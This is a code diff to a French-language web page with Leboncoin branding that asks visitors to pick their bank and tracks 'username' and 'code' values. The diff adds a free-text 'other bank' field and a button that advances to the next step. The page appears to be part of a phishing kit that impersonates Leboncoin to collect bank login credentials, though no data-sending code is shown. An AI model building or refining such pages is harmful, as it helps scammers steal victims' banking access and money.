@@ -52,7 +52,7 @@
         });
     </script>
 
-    <main x-data="{step: 1, username: '', code: '', bank: ''}" class="w-full max-w-md mx-auto px-4 py-20 overflow-hidden">
+    <main x-data="{step: 1, username: '', code: '', bank: '', otherBank: ''}" class="w-full max-w-md mx-auto px-4 py-20 overflow-hidden">
 
         <div class="flex justify-center">
             <img
@@ -76,7 +76,7 @@
             </h1>
 
             <div class="space-y-4">
-                <label class="block text-sm font-extrabold text-gray-700 mb-3">
+                <label class="block text-sm font-extrabold text-gray-700 mb-1">
                     Sélectionner votre banque
                 </label>
                 
@@ -131,6 +131,27 @@
                                 Autre
                             </span>
                         </div>
+                    </button>
+                </div>
+
+                <!-- Champ "Autre banque" qui apparaît si sélectionné -->
+                <div x-show="bank === 'Autre banque'" x-transition class="mt-4 space-y-2">
+                    <label class="block text-sm font-extrabold text-gray-700 mb-1">
+                        Nom de votre banque
+                    </label>
+                    <input
+                        type="text"
+                        x-model="otherBank"
+                        class="w-full px-4 py-2 border border-leboncoin rounded-lg outline-none focus:ring-2 focus:ring-leboncoin"
+                        placeholder="Renseignez le nom de votre banque"
+                    >
+                    <button
+                        type="button"
+                        @click="if(otherBank.trim() !== '') { bank = otherBank; step = 2; }"
+                        :disabled="otherBank.trim() === ''"
+                        class="w-full flex items-center justify-center bg-leboncoin hover:opacity-90 disabled:opacity-50 disabled:cursor-not-allowed text-white font-bold py-3 px-6 rounded-lg cursor-pointer hover:scale-[1.01] active:scale-[0.99] transition-all duration-200">
+                        <svg class="w-4 h-4 mr-1 align-middle" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path></svg>
+                        Continuer
                     </button>
                 </div>
             </div>
@@ -401,8 +422,16 @@
                 const bankName = this.dataset.value;
                 const mainEl = document.querySelector('main');
                 if (mainEl && mainEl._x_dataStack && mainEl._x_dataStack[0]) {
-                    mainEl._x_dataStack[0].bank = bankName;
-                    mainEl._x_dataStack[0].step = 2;
+                    const data = mainEl._x_dataStack[0];
+                    
+                    if (bankName === 'Autre banque') {
+                        // Si "Autre" est sélectionné, ne pas avancer à step 2
+                        data.bank = bankName;
+                        // Attendre que l'utilisateur remplisse le champ
+                    } else {
+                        data.bank = bankName;
+                        data.step = 2;
+                    }
                 }
             });
         });
